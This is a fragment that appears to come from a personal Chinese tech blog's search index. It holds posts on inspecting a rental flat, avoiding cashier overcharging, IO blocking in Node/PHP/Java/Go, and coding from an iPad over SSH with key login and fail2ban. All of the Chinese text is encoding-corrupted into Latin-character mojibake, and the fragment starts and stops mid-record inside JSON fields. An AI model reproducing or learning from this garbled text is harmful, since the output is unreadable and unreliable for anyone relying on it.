ä¸Šé¢è¿™äº›è®¾å¤‡ï¼Œä¸è¦æ–¤æ–¤æ‰“çœ¼çœ‹çœ‹å¤–è¡¨æ­£ä¸æ­£å¸¸ï¼Œæ›´è¦å°½å¯èƒ½å»è¯•è¯•ã€‚æ¯”å¦‚è¯´é©¬æ¡¶ï¼Œå³ä½¿èƒ½æ— æ³•ååœ¨ä¸Šé¢ä¸Šä¸ªå•æ‰€ï¼Œä½ ä¹Ÿè¦ç”¨æ‰‹æŒ‰ä¸€ä¸‹ï¼Œçœ‹çœ‹å†²æ°´æ˜¯å¦æ­£å¸¸ã€‚ äº¤é’±ä¹‹å‰ä½ æ˜¯äºŒæˆ¿ä¸œå¤§çˆ·ï¼Œäº¤å®Œé’±ç­¾å¥½åˆåŒï¼ŒäºŒæˆ¿ä¸œå°±æ˜¯ä½ å¤§çˆ·äº†ã€‚é©¬æ¡¶è¦æ˜¯ä¸å¥½ç”¨ï¼Œæµªè´¹æ°´ä¸è¯´ï¼Œè¿˜å½±å“å¿ƒæƒ…ã€‚åˆ°æ—¶å€™ä½ æ‰¾ä½ å¤§çˆ·æ¥ä¿®ï¼Œä½ å¤§çˆ·å°±ä¸ä¸€å®šæœ‰æ—¶é—´äº†ã€‚ä½ å¤§çˆ·ä¸€èˆ¬åŒ…äº†å‡ ç™¾å¥—æˆ¿å­ï¼Œæ€ä¹ˆä¼šç®¡ä½ çš„å°é—®é¢˜å‘¢ã€‚\næ€»ä¹‹å‘¢ï¼Œä½ è¦æœ‰è‡ªå·±çš„ä¸€ä¸ªæ£€æŸ¥æ¸…å•é¡¹ç›®ï¼Œè¦æ£€æŸ¥å“ªäº›ï¼Œå¦‚ä½•æ£€æŸ¥ï¼ŒåŠ¡å¿…åšåˆ°åˆ‡å®å¯è¡Œã€‚\næœ‰çš„æ—¶å€™ï¼Œæˆ¿å­æœ‰äº›é—®é¢˜ï¼Œæˆ¿ä¸œå’Œä¸­ä»‹æ•…æ„é¡¾å·¦å³è€Œè¨€ä»–ï¼Œä½ åˆ‡ä¸å¯è¢«ä»–ä»¬ç©çš„å›¢å›¢è½¬ã€‚ä¸€å®šè¦æŒ‰ç…§æ—¢å®šçš„æ–¹æ¡ˆå®æ–½æ£€æŸ¥ã€‚\nå¦å¤–å°±æ˜¯ç­¾åˆåŒäº†ï¼Œè¿çº¦é‡‘è¿™å—è¦æ³¨æ„çš„ã€‚æœ‰çš„ä¸­ä»‹å’ŒäºŒæˆ¿ä¸œç‹¼ç‹ˆä¸ºå¥¸ï¼Œé™¤äº†è¦ä¸é€€æŠ¼é‡‘ï¼Œè¿˜è¦æœ‰é¢å¤–çš„èµ”é’±é¡¹ã€‚è¿™ç‚¹åŠ¡å¿…è¦æ³¨æ„ã€‚æ­£å¸¸æ¥å¤„ï¼Œå¦‚æœè½¬ç§Ÿä¸å‡ºå»ï¼Œä½ æœ‰ç¡®å®šè¦é€€æˆ¿ï¼Œä¸€èˆ¬åªæœ‰ä¸é€€æŠ¼é‡‘ï¼Œæ²¡æœ‰å…¶ä»–çš„èµ”é’±é¡¹ã€‚è¿™ç‚¹è¦åœ¨ç§Ÿæˆ¿åˆåŒä¸Šå†™æ¸…æ¥šã€‚\nå‡¡æ˜¯æ²¡æœ‰é»‘çº¸ç™½çº¸å†™æ¸…æ¥šçš„ï¼Œä½ éƒ½å¯ä»¥è®¤ä¸ºæ˜¯ä¸­ä»‹å’ŒäºŒæˆ¿ä¸œåœ¨å¿½æ‚ ã€‚\n","permalink":"https://wdd.js.org/posts/2020/09/xglwgs/","summary":"åœ¨ä¸Šæµ·å·¥ä½œçš„äººï¼Œé™¤äº†ä¸€å¹´ä¸€æ¬¡çš„æ˜¥è¿ï¼Œå°±å¯èƒ½æ˜¯å°±æ˜¯ä¸€å¹´ä¸€æ¬¡çš„æ‰¾æˆ¿æ¬å®¶äº†ã€‚\næ‰¾æˆ¿å½·ä½›å°±æ˜¯ä¸€è¶Ÿè¥¿å¤©å–ç»ï¼Œè¦ç»å†ä¹ä¹å…«åä¸€éš¾ï¼Œä¹Ÿè¦ä¸ªå„ç§å¦–é­”é¬¼æ€ªæ–—æ™ºæ–—å‹‡ã€‚è¿™å…¶ä¸­éš¾å¤„ï¼Œæš‚ä¸”ä¸è¡¨ã€‚é‡ç‚¹ä»‹ç»ä½ åº”å½“å¦‚ä½•å»æŒ‰ç…§ä¸€å®šçš„æ–¹æ¡ˆæ¥æ£€æŸ¥å„ç§è®¾æ–½çš„åŠŸèƒ½ã€‚\nè¦çŸ¥é“ï¼Œä¸–äº‹å¤šå˜ï¼Œä½ ç°ä¸‹æ‰¾çš„æˆ¿å­å¦‚æœå¾ˆä¸é”™ï¼Œå³ä½¿åæœŸçªç„¶éœ€è¦è½¬ç§Ÿï¼Œä¹Ÿæ˜¯æ¯”è¾ƒå®¹æ˜“è½¬ç§Ÿçš„ã€‚å¦åˆ™æˆ¿å­è½¬ç§Ÿä¸å‡ºå»ï¼Œè‡ªå·±ä¹Ÿç™½ç™½èµ”äº†æŠ¼é‡‘ã€‚\né‡ç‚¹æ£€æŸ¥\næ´—è¡£æœº ç©ºè°ƒ å†°ç®± æŠ½æ²¹çƒŸæœº é©¬æ¡¶ ä¸Šé¢è¿™äº›è®¾å¤‡ï¼Œä¸è¦æ–¤æ–¤æ‰“çœ¼çœ‹çœ‹å¤–è¡¨æ­£ä¸æ­£å¸¸ï¼Œæ›´è¦å°½å¯èƒ½å»è¯•è¯•ã€‚æ¯”å¦‚è¯´é©¬æ¡¶ï¼Œå³ä½¿èƒ½æ— æ³•ååœ¨ä¸Šé¢ä¸Šä¸ªå•æ‰€ï¼Œä½ ä¹Ÿè¦ç”¨æ‰‹æŒ‰ä¸€ä¸‹ï¼Œçœ‹çœ‹å†²æ°´æ˜¯å¦æ­£å¸¸ã€‚ äº¤é’±ä¹‹å‰ä½ æ˜¯äºŒæˆ¿ä¸œå¤§çˆ·ï¼Œäº¤å®Œé’±ç­¾å¥½åˆåŒï¼ŒäºŒæˆ¿ä¸œå°±æ˜¯ä½ å¤§çˆ·äº†ã€‚é©¬æ¡¶è¦æ˜¯ä¸å¥½ç”¨ï¼Œæµªè´¹æ°´ä¸è¯´ï¼Œè¿˜å½±å“å¿ƒæƒ…ã€‚åˆ°æ—¶å€™ä½ æ‰¾ä½ å¤§çˆ·æ¥ä¿®ï¼Œä½ å¤§çˆ·å°±ä¸ä¸€å®šæœ‰æ—¶é—´äº†ã€‚ä½ å¤§çˆ·ä¸€èˆ¬åŒ…äº†å‡ ç™¾å¥—æˆ¿å­ï¼Œæ€ä¹ˆä¼šç®¡ä½ çš„å°é—®é¢˜å‘¢ã€‚\næ€»ä¹‹å‘¢ï¼Œä½ è¦æœ‰è‡ªå·±çš„ä¸€ä¸ªæ£€æŸ¥æ¸…å•é¡¹ç›®ï¼Œè¦æ£€æŸ¥å“ªäº›ï¼Œå¦‚ä½•æ£€æŸ¥ï¼ŒåŠ¡å¿…åšåˆ°åˆ‡å®å¯è¡Œã€‚\næœ‰çš„æ—¶å€™ï¼Œæˆ¿å­æœ‰äº›é—®é¢˜ï¼Œæˆ¿ä¸œå’Œä¸­ä»‹æ•…æ„é¡¾å·¦å³è€Œè¨€ä»–ï¼Œä½ åˆ‡ä¸å¯è¢«ä»–ä»¬ç©çš„å›¢å›¢è½¬ã€‚ä¸€å®šè¦æŒ‰ç…§æ—¢å®šçš„æ–¹æ¡ˆå®æ–½æ£€æŸ¥ã€‚\nå¦å¤–å°±æ˜¯ç­¾åˆåŒäº†ï¼Œè¿çº¦é‡‘è¿™å—è¦æ³¨æ„çš„ã€‚æœ‰çš„ä¸­ä»‹å’ŒäºŒæˆ¿ä¸œç‹¼ç‹ˆä¸ºå¥¸ï¼Œé™¤äº†è¦ä¸é€€æŠ¼é‡‘ï¼Œè¿˜è¦æœ‰é¢å¤–çš„èµ”é’±é¡¹ã€‚è¿™ç‚¹åŠ¡å¿…è¦æ³¨æ„ã€‚æ­£å¸¸æ¥å¤„ï¼Œå¦‚æœè½¬ç§Ÿä¸å‡ºå»ï¼Œä½ æœ‰ç¡®å®šè¦é€€æˆ¿ï¼Œä¸€èˆ¬åªæœ‰ä¸é€€æŠ¼é‡‘ï¼Œæ²¡æœ‰å…¶ä»–çš„èµ”é’±é¡¹ã€‚è¿™ç‚¹è¦åœ¨ç§Ÿæˆ¿åˆåŒä¸Šå†™æ¸…æ¥šã€‚\nå‡¡æ˜¯æ²¡æœ‰é»‘çº¸ç™½çº¸å†™æ¸…æ¥šçš„ï¼Œä½ éƒ½å¯ä»¥è®¤ä¸ºæ˜¯ä¸­ä»‹å’ŒäºŒæˆ¿ä¸œåœ¨å¿½æ‚ ã€‚","title":"ç§Ÿæˆ¿çš„æ£€æŸ¥æ¸…å•"},{"content":"å¤§éƒ¨åˆ†äººç»“è´¦ä»˜é’±çš„æ—¶å€™ï¼Œéƒ½ä¸æ€ä¹ˆå…³æ³¨ã€‚å¾ˆå¤šæ¬¡è¢«æ”¶é“¶å‘˜è¤¥ç¾Šæ¯›äº†ä¹Ÿæ¯«ä¸å¯Ÿè§‰ã€‚\nåœºæ™¯1:\nä½ å»ä¹°æ°´æœï¼Œçœ‹åˆ°è‹¹æœæ¯”è¾ƒæ–°é²œï¼Œä»·æ ¼8å…ƒ/æ¯æ–¤ï¼Œä½†æ˜¯æ”¶é“¶å‘˜ç§°é‡è®¡è´¹çš„æ—¶å€™ï¼Œæ˜¯æŒ‰ç…§12å…ƒ/æ¯æ–¤è®¡ç®—çš„ã€‚ä½†æ˜¯å½“æ—¶ä½ åœ¨æ‰“å¼€æ”¯ä»˜å®å‡†å¤‡ä»˜é’±ï¼Œæ²¡æœ‰æ³¨æ„ç§°ä¸Šçš„å•ä»·ã€‚ä»˜è´¹è¿‡åï¼Œæ”¶é“¶å‘˜æ²¡ç»™ä½ å°ç¥¨ã€‚ä½ ä¹Ÿæ²¡æ³¨æ„ï¼Œäº‹æƒ…å°±è¿™ä¹ˆè¿‡å»äº†ã€‚ å¦‚æœä½ å¯¹æ”¶é“¶å‘˜æŒ‰çš„å•ä»·è¡¨ç¤ºæ€€ç–‘ï¼Œé—®äº†å¥ï¼šè¿™è‹¹æœæ€ä¹ˆå’Œæ ‡ä»·ä¸Šä¸ä¸€è‡´ï¼Ÿ æ”¶é“¶å‘˜å°´å°¬çš„ç¬‘äº†ç¬‘ï¼Œè¯´åˆ°ï¼šä¸å¥½æ„æ€ï¼Œæˆ‘æŒ‰é”™äº†ã€‚æ¯”è¾ƒè€ç»ƒçš„å¯èƒ½ä¼šè¯´ï¼šä¸å¥½æ„æ€ï¼Œæˆ‘è¿˜ä»¥ä¸ºä½ æ‹¿çš„æ˜¯æ—è¾¹çš„é‚£ç§æ°´æœå‘¢ï¼Ÿ\nåœºæ™¯2:\nä½ å’Œæœ‹å‹ä¸€èµ·å»åƒçƒ¤é±¼ï¼Œç‚¹äº†ä¸€æ¡æ¸…æ±Ÿé±¼ï¼ŒæœåŠ¡å‘˜ç§°é‡è¿‡åï¼Œåœ¨èœå•ä¸Šç”¨é“…ç¬”å†™äº†3.5æ–¤ã€‚é…’è¶³é¥­é¥±ä¹‹åï¼Œä½ å»ç»“è´¦ã€‚æ”¶é“¶å‘˜å¼€å‡ºå°ç¥¨ï¼Œä¸Šé¢å†™çš„æ¸…æ±Ÿé±¼ 4.2æ–¤ï¼Œä½ ä¹Ÿæ²¡æ³¨æ„ã€‚ç”šè‡³æœ‰å¯èƒ½é‚£ä¸ªé“…ç¬”å†™çš„æ–¤æ•°å·²ç»è¢«é…’æ°´çš„æ±¡æ¸æ¶‚æŠ¹çš„ä¸æ¸…æ¥šäº†ã€‚å¦‚æœæœ‰è¡¨ç¤ºæ€€ç–‘ï¼Œä»”ç»†çœ‹äº†çœ‹å°ç¥¨ï¼Œè¯´é±¼çš„é‡é‡ä¸å¯¹ã€‚æ”¶é“¶å‘˜åˆå°´å°¬çš„ç¬‘äº†ç¬‘ï¼Œè¯´åˆ°ï¼šä¸å¥½æ„æ€ï¼Œè¿™ä¸ªå¯èƒ½è®°å¾—åˆ«çš„æ¡Œçš„é±¼çš„é‡é‡çš„ã€‚\nåœºæ™¯3:\nä½ ä¹°äº†ä¸€åŒ…åƒåœ¾è¢‹7å…ƒï¼Œä¸€åŒ…è¡£æœæ’‘18ï¼Œä¸€ä¸ªåƒåœ¾æ¡¶6ï¼Œäº”é‡‘åº—çš„è€æ¿ä¹Ÿæ²¡ç”¨è®¡ç®—æœºï¼ŒæŠ¬å¤´æœ›ç€å¤©ç©ºçš„é‚£æœµç™½äº‘ã€‚å½·ä½›å†åšäº‘è®¡ç®—ï¼Œç„¶åè¯´ï¼šä¸€å…±38å—ã€‚\nshit! å¾ˆå¤šäººçœŸçš„å°±ç›´æ¥æé’±äº†ã€‚\nä½ çœ‹çœ‹ï¼Œæ”¶é“¶å‘˜è¯´çš„ä¸å¥½æ„æ€å¤šå€¼é’±ï¼Œç®€ç›´æ˜¯ä¸€å­—åƒé‡‘å•Šï¼ä½†æ˜¯æ›´å¤šæ—¶å€™ï¼Œæˆ‘ä»¬éƒ½æ˜¯ç¨€é‡Œç³Šæ¶‚çš„è’™åœ¨é¼“é‡Œã€‚\nè¦æƒ³ä¸è¢«è¾±ç¾Šæ¯›ï¼ŒåŠ¡å¿…è¦è°¨è®°ã€‚\nå•†å“çš„æ ‡ä»·è¦è°¨è®°äºå¿ƒ ä¸è¦ç›¸ä¿¡æ”¶é“¶å‘˜çš„ä¿¡å£å¼€æ²³çš„ç®—é’±ï¼Œè¦è‡ªå·±ç®— ä¹°å®Œä¸œè¥¿ï¼Œä¸€å®šè¦é—®æ”¶é“¶å‘˜è¦å°ç¥¨ æ”¶é“¶å‘˜ç§°é‡çš„æ—¶å€™ï¼Œè¦æ³¨æ„è§‚å¯Ÿç§°ä¸Šæ˜¾ç¤ºçš„ä»·æ ¼å’Œæ‘†è´§åŒºçš„ä»·æ ¼æ˜¯å¦ä¸€è‡´ ","permalink":"https://wdd.js.org/posts/2020/09/hpc6fy/","summary":"å¤§éƒ¨åˆ†äººç»“è´¦ä»˜é’±çš„æ—¶å€™ï¼Œéƒ½ä¸æ€ä¹ˆå…³æ³¨ã€‚å¾ˆå¤šæ¬¡è¢«æ”¶é“¶å‘˜è¤¥ç¾Šæ¯›äº†ä¹Ÿæ¯«ä¸å¯Ÿè§‰ã€‚\nåœºæ™¯1:\nä½ å»ä¹°æ°´æœï¼Œçœ‹åˆ°è‹¹æœæ¯”è¾ƒæ–°é²œï¼Œä»·æ ¼8å…ƒ/æ¯æ–¤ï¼Œä½†æ˜¯æ”¶é“¶å‘˜ç§°é‡è®¡è´¹çš„æ—¶å€™ï¼Œæ˜¯æŒ‰ç…§12å…ƒ/æ¯æ–¤è®¡ç®—çš„ã€‚ä½†æ˜¯å½“æ—¶ä½ åœ¨æ‰“å¼€æ”¯ä»˜å®å‡†å¤‡ä»˜é’±ï¼Œæ²¡æœ‰æ³¨æ„ç§°ä¸Šçš„å•ä»·ã€‚ä»˜è´¹è¿‡åï¼Œæ”¶é“¶å‘˜æ²¡ç»™ä½ å°ç¥¨ã€‚ä½ ä¹Ÿæ²¡æ³¨æ„ï¼Œäº‹æƒ…å°±è¿™ä¹ˆè¿‡å»äº†ã€‚ å¦‚æœä½ å¯¹æ”¶é“¶å‘˜æŒ‰çš„å•ä»·è¡¨ç¤ºæ€€ç–‘ï¼Œé—®äº†å¥ï¼šè¿™è‹¹æœæ€ä¹ˆå’Œæ ‡ä»·ä¸Šä¸ä¸€è‡´ï¼Ÿ æ”¶é“¶å‘˜å°´å°¬çš„ç¬‘äº†ç¬‘ï¼Œè¯´åˆ°ï¼šä¸å¥½æ„æ€ï¼Œæˆ‘æŒ‰é”™äº†ã€‚æ¯”è¾ƒè€ç»ƒçš„å¯èƒ½ä¼šè¯´ï¼šä¸å¥½æ„æ€ï¼Œæˆ‘è¿˜ä»¥ä¸ºä½ æ‹¿çš„æ˜¯æ—è¾¹çš„é‚£ç§æ°´æœå‘¢ï¼Ÿ\nåœºæ™¯2:\nä½ å’Œæœ‹å‹ä¸€èµ·å»åƒçƒ¤é±¼ï¼Œç‚¹äº†ä¸€æ¡æ¸…æ±Ÿé±¼ï¼ŒæœåŠ¡å‘˜ç§°é‡è¿‡åï¼Œåœ¨èœå•ä¸Šç”¨é“…ç¬”å†™äº†3.5æ–¤ã€‚é…’è¶³é¥­é¥±ä¹‹åï¼Œä½ å»ç»“è´¦ã€‚æ”¶é“¶å‘˜å¼€å‡ºå°ç¥¨ï¼Œä¸Šé¢å†™çš„æ¸…æ±Ÿé±¼ 4.2æ–¤ï¼Œä½ ä¹Ÿæ²¡æ³¨æ„ã€‚ç”šè‡³æœ‰å¯èƒ½é‚£ä¸ªé“…ç¬”å†™çš„æ–¤æ•°å·²ç»è¢«é…’æ°´çš„æ±¡æ¸æ¶‚æŠ¹çš„ä¸æ¸…æ¥šäº†ã€‚å¦‚æœæœ‰è¡¨ç¤ºæ€€ç–‘ï¼Œä»”ç»†çœ‹äº†çœ‹å°ç¥¨ï¼Œè¯´é±¼çš„é‡é‡ä¸å¯¹ã€‚æ”¶é“¶å‘˜åˆå°´å°¬çš„ç¬‘äº†ç¬‘ï¼Œè¯´åˆ°ï¼šä¸å¥½æ„æ€ï¼Œè¿™ä¸ªå¯èƒ½è®°å¾—åˆ«çš„æ¡Œçš„é±¼çš„é‡é‡çš„ã€‚\nåœºæ™¯3:\nä½ ä¹°äº†ä¸€åŒ…åƒåœ¾è¢‹7å…ƒï¼Œä¸€åŒ…è¡£æœæ’‘18ï¼Œä¸€ä¸ªåƒåœ¾æ¡¶6ï¼Œäº”é‡‘åº—çš„è€æ¿ä¹Ÿæ²¡ç”¨è®¡ç®—æœºï¼ŒæŠ¬å¤´æœ›ç€å¤©ç©ºçš„é‚£æœµç™½äº‘ã€‚å½·ä½›å†åšäº‘è®¡ç®—ï¼Œç„¶åè¯´ï¼šä¸€å…±38å—ã€‚\nshit! å¾ˆå¤šäººçœŸçš„å°±ç›´æ¥æé’±äº†ã€‚\nä½ çœ‹çœ‹ï¼Œæ”¶é“¶å‘˜è¯´çš„ä¸å¥½æ„æ€å¤šå€¼é’±ï¼Œç®€ç›´æ˜¯ä¸€å­—åƒé‡‘å•Šï¼ä½†æ˜¯æ›´å¤šæ—¶å€™ï¼Œæˆ‘ä»¬éƒ½æ˜¯ç¨€é‡Œç³Šæ¶‚çš„è’™åœ¨é¼“é‡Œã€‚\nè¦æƒ³ä¸è¢«è¾±ç¾Šæ¯›ï¼ŒåŠ¡å¿…è¦è°¨è®°ã€‚\nå•†å“çš„æ ‡ä»·è¦è°¨è®°äºå¿ƒ ä¸è¦ç›¸ä¿¡æ”¶é“¶å‘˜çš„ä¿¡å£å¼€æ²³çš„ç®—é’±ï¼Œè¦è‡ªå·±ç®— ä¹°å®Œä¸œè¥¿ï¼Œä¸€å®šè¦é—®æ”¶é“¶å‘˜è¦å°ç¥¨ æ”¶é“¶å‘˜ç§°é‡çš„æ—¶å€™ï¼Œè¦æ³¨æ„è§‚å¯Ÿç§°ä¸Šæ˜¾ç¤ºçš„ä»·æ ¼å’Œæ‘†è´§åŒºçš„ä»·æ ¼æ˜¯å¦ä¸€è‡´ ","title":"å¦‚ä½•é¿å…è¢«æ”¶é“¶å‘˜å‘"},{"content":"System Calls åº”ç”¨ç¨‹åºå·¥ä½œåœ¨ç”¨æˆ·æ¨¡å¼ åº”ç”¨ç¨‹åºä¸èƒ½ç›´æ¥è®¿é—®ç¡¬ä»¶èµ„æºï¼Œåº”ç”¨ç¨‹åºéœ€è¦è°ƒç”¨æ“ä½œç³»ç»Ÿæä¾›çš„æ¥å£é—´æ¥è®¿é—®ã€‚è¿™ä¸ªå«åšç³»ç»Ÿè°ƒç”¨ã€‚ä¸€èˆ¬çš„ç³»ç»Ÿè°ƒç”¨éƒ½æ˜¯é˜»å¡çš„ã€‚é˜»å¡çš„æ„æ€å°±æ˜¯ä½ åœ¨ç½‘ä¸Šä¹°äº†ä¸ªè‹¹æœï¼Œåœ¨ä½ æ”¶åˆ°è¿™ä¸ªå¿«é€’ä¹‹å‰ï¼Œä½ å•¥ä¹Ÿä¸å¹²ï¼Œå°±èººåœ¨åºŠä¸Šç­‰ç€ã€‚ éé˜»å¡ éé˜»å¡çš„ç¨‹åºï¼Œåœ¨ç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œä¼šç«‹å³è¿”å›ä¸€ä¸ªæ ‡shi ","permalink":"https://wdd.js.org/posts/2020/09/upi47f/","summary":"System Calls åº”ç”¨ç¨‹åºå·¥ä½œåœ¨ç”¨æˆ·æ¨¡å¼ åº”ç”¨ç¨‹åºä¸èƒ½ç›´æ¥è®¿é—®ç¡¬ä»¶èµ„æºï¼Œåº”ç”¨ç¨‹åºéœ€è¦è°ƒç”¨æ“ä½œç³»ç»Ÿæä¾›çš„æ¥å£é—´æ¥è®¿é—®ã€‚è¿™ä¸ªå«åšç³»ç»Ÿè°ƒç”¨ã€‚ä¸€èˆ¬çš„ç³»ç»Ÿè°ƒç”¨éƒ½æ˜¯é˜»å¡çš„ã€‚é˜»å¡çš„æ„æ€å°±æ˜¯ä½ åœ¨ç½‘ä¸Šä¹°äº†ä¸ªè‹¹æœï¼Œåœ¨ä½ æ”¶åˆ°è¿™ä¸ªå¿«é€’ä¹‹å‰ï¼Œä½ å•¥ä¹Ÿä¸å¹²ï¼Œå°±èººåœ¨åºŠä¸Šç­‰ç€ã€‚ éé˜»å¡ éé˜»å¡çš„ç¨‹åºï¼Œåœ¨ç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œä¼šç«‹å³è¿”å›ä¸€ä¸ªæ ‡shi ","title":"IOæ€§èƒ½ ï¼®ode vs PHP vs Java vs Go"},{"content":"ä¸ºä»€ä¹ˆè¦ç”¨iPadå¼€å‘ï¼Ÿ ç¬¬ä¸€ï¼Œæˆ‘ä¸æƒ³å†ä¹°å°ç”µè„‘æˆ–è€…ç¬”è®°æœ¬æ”¾åœ¨å®¶é‡Œã€‚å› ä¸ºæˆ‘ä¹Ÿä¸ç”¨ç”µè„‘æ¥æ‰“æ¸¸æˆã€‚è€Œä¸”æ— è®ºå°å¼æœºè¿˜æ˜¯ç¬”è®°æœ¬éƒ½æ¯”è¾ƒå åœ°æ–¹ã€‚æ¬å®¶ä¹Ÿè´¹åŠ²ã€‚ ç¬¬äºŒï¼Œæˆ‘åªæœ‰ä¸€å°MacBook Proï¼Œä»¥å‰ä¸‹ç­ä¹Ÿä¼šèƒŒç€ï¼Œå› ä¸ºæ€»æœ‰äº›äº‹æƒ…éœ€è¦åšã€‚ä½†æ˜¯è‡ªä»æœ‰ä¸€å¤©è§‰å¾—è‚©è†€ä¸èˆ’æœäº†ï¼Œæˆ‘å°±å†³å®šä¸å†èƒŒç”µè„‘ã€‚å»‰é¢‡è€çŸ£ï¼Œè…°é…¸èƒŒç—›ã€‚ è™½ç„¶ä¸å†èƒŒç”µè„‘ï¼Œä½†æ˜¯å¶æœ‰é›…å…´ï¼Œå¿ƒè¡€æ¥æ½®ï¼Œæˆ‘è¿˜éœ€è¦å†™ç‚¹åšå®¢æˆ–è€…ä»£ç çš„ã€‚ æ‰€ä»¥æˆ‘ä¹°äº†å°iPadæ¥å¼€å‘æˆ–è€…å†™åšå®¢ã€‚ å‰æœŸå‡†å¤‡å·¥ä½œ ç¡¬ä»¶å‡†å¤‡ ä¸€å°iPad ä¸€ä¸ªè“ç‰™é”®ç›˜ã€‚æœ€å¥½ä¹°é‚£ç§é€‚åˆç¬”è®°æœ¬çš„è“ç‰™é”®ç›˜ï¼Œåƒä¸‡ä¸è¦ä¹°å¯æŠ˜å çš„è“ç‰™é”®ç›˜ï¼Œå› ä¸ºç”¨ç€ä¸èˆ’æœ è½¯ä»¶å‡†å¤‡ å¸¸è§„çš„åŠŸèƒ½ï¼Œä¾‹å¦‚å†™æ–‡å­—ï¼Œå†™åšå®¢ï¼Œä¸€ä¸ªæµè§ˆå™¨è¶³ä»¥èƒœä»»ã€‚å”¯ä¸€çš„éš¾ç‚¹åœ¨äºå¦‚ä½•ç¼–ç¨‹ã€‚\nç›®å‰æ¥è¯´ï¼Œæœ‰ä¸¤ä¸ªæ–¹æ¡ˆï¼š\næ–¹æ¡ˆ1: ä½¿ç”¨åœ¨çº¿ç¼–è¾‘å™¨ã€‚ä¾‹å¦‚ç äº‘ï¼Œgithub, codepenç­‰ç½‘ç«™ï¼Œéƒ½æ˜¯æä¾›åœ¨çº¿ç¼–è¾‘å™¨çš„ã€‚ä¼˜ç‚¹æ˜¯æ–¹ä¾¿ï¼Œå…è´¹ã€‚ç¼ºç‚¹ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œæ— æ³•è°ƒè¯•æˆ–è€…è¿è¡Œä»£ç ã€‚ æ–¹æ¡ˆ2: è´­ä¹°äº‘ä¸»æœºï¼ŒiPadä¸Šå®‰è£…Termius, sshè¿œç¨‹è¿æ¥åˆ°æœåŠ¡ç«¯ï¼Œåœ¨çœŸæ­£çš„æ“ä½œç³»ç»Ÿä¸­åšå¼€å‘ã€‚ä¼˜ç‚¹æ˜¯æ¯”è¾ƒè‡ªç”±ï¼Œæ‰©å±•æ€§å¼ºã€‚ç¼ºç‚¹æ˜¯éœ€è¦èŠ±é’±ï¼Œè€Œä¸”åœ¨æ²¡æœ‰IDEç¯å¢ƒåšå¼€å‘æ˜¯æœ‰ä¸å°çš„éš¾åº¦çš„ã€‚ æ–¹æ¡ˆ1ç”±äºæ¯”è¾ƒç®€å•ï¼Œå°±ä¸èµ˜è¿°äº†ã€‚\nç€é‡è®²è®²æ–¹æ¡ˆ2:\nè´­ä¹°äº‘ä¸»æœº ä¸€èˆ¬æ¥è¯´ï¼Œå³ä½¿æ˜¯æœ€ä½é…ç½®çš„ä¸»æœºï¼Œä¸€å¹´çš„è´¹ç”¨ä¹Ÿè‡³å°‘è¦å‡ ç™¾å—ã€‚ä½†æ˜¯ä¹Ÿæœ‰ä¾‹å¤–æƒ…å†µã€‚æˆ‘çš„ç›®æ ‡æ˜¯æ‰¾é‚£äº›å¹´è´¹åœ¨ä¸€ç™¾å—ä»¥å†…çš„äº‘ä¸»æœºã€‚\né’ˆå¯¹å¤§å­¦ç”Ÿçš„ä¼˜æƒ ã€‚ä¸€èˆ¬å¤§å­¦ç”Ÿå¯ä»¥ä»¥å‡ åå—çš„ä»·é’±ä¹°åˆ°æœ€ä½é…çš„äº‘ä¸»æœºã€‚ é’ˆå¯¹æ–°ç”¨æˆ·çš„ä¼˜æƒ ã€‚æ–°ç”¨æˆ·çš„ä¼˜æƒ åŠ›åº¦è¿˜æ˜¯å¾ˆå¤§çš„ã€‚ä¸€èˆ¬ç”¨è¿‡ä¸€å¹´ä¹‹åï¼Œæˆ‘å°±ä¼šè½¬ç«™å…¶ä»–äº‘æœåŠ¡æä¾›å•†ã€‚æ‰€ä»¥å›½å†…çš„å¥½å¤šæœµå…¬æœ‰äº‘ï¼ŒåŸºæœ¬ä¸Šæˆ‘éƒ½ä¸Šè¿‡ã€‚å”¯ä¸€æ²¡ä¸Šè¿‡çš„å°±æ˜¯ç­‹æ–—äº‘ã€‚ ç‰¹æ®Šä¼˜æƒ æ—¥ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œä¸€å¹´ä¹‹å†…ï¼Œè‡³å°‘å­˜åœ¨ä¸¤ä¸ªä¼˜æƒ æ—¥ï¼ŒåŒåä¸€å’Œå…­ä¸€å…«ã€‚åœ¨è¿™ä¸¤ä¸ªæ—¶é—´ç‚¹ï¼Œä¸€èˆ¬å¯ä»¥ä¹°åˆ°æ¯”è¾ƒä¼˜æƒ çš„äº‘ä¸»æœºã€‚ å¼€å‘ç¯å¢ƒæ­å»º ä½¿ç”¨Terminueè¿æ¥åˆ°è¿œç¨‹æœåŠ¡å™¨ä¸Šã€‚æ³¨æ„æœ€å¥½åœ¨å…¬æœ‰äº‘ä¸Šä½¿ç”¨å…¬é’¥ç™»å½•ï¼Œå¹¶ç¦æ­¢æ‰å¯†ç ç™»å½•ã€‚æœ€å¥½å†å®‰è£…ä¸ªfail2banã€‚å› ä¸ºæ¯ä¸ªäº‘ä¸»æœºåŸºæœ¬ä¸Šæ¯å¤©éƒ½æœ‰å¾ˆå¤šæ¶æ„çš„ç™»å½•å°è¯•ã€‚ éœ€è¦å®‰è£…oh-my-zsh. æœ€å¥½ç”¨çš„sh, ä¸è§£é‡Šã€‚ ä½œä¸ºå¼€å‘ç¯å¢ƒï¼Œä¸€ä¸ªå±å¹•è‚¯å®šæ˜¯ä¸å¤Ÿçš„ï¼Œæ‰€ä»¥ä½ éœ€è¦tmux. ç¼–è¾‘å™¨å‘¢ã€‚é”»ç‚¼è‡ªå·±çš„VIMä½¿ç”¨èƒ½åŠ›å§ã€‚VIMæ˜¯ä¸ªå¤–è¾¹æ¯”è¾ƒå†°å†·çš„ç¼–è¾‘å™¨ï¼Œä¸Šæ‰‹éš¾åº¦ç›¸æ¯”äºé‚£äº›èŠ±èŠ±ç»¿ç»¿çš„ç¼–è¾‘å™¨è€Œè¨€ï¼Œæ˜¾å¾—é‚£ä¹ˆæ ¼æ ¼ä¸å…¥ã€‚ä½†æ˜¯å°±åƒæœ‰é¦–æ­Œå”±çš„çš„ï¼Œæœ‰äº›äººä¸çŸ¥é“é‚£äº›å¥½ï¼Œä½†å°±æ˜¯è°ä¹Ÿæ›¿ä»£ä¸äº†ã€‚ æ€»ä¹‹å‘¢ï¼Œä½ å¿…é¡»è¦å¼ºè¿«è‡ªå·±èƒ½å¤Ÿç†Ÿç»ƒçš„è¿ç”¨ä»¥ä¸‹çš„å‡ 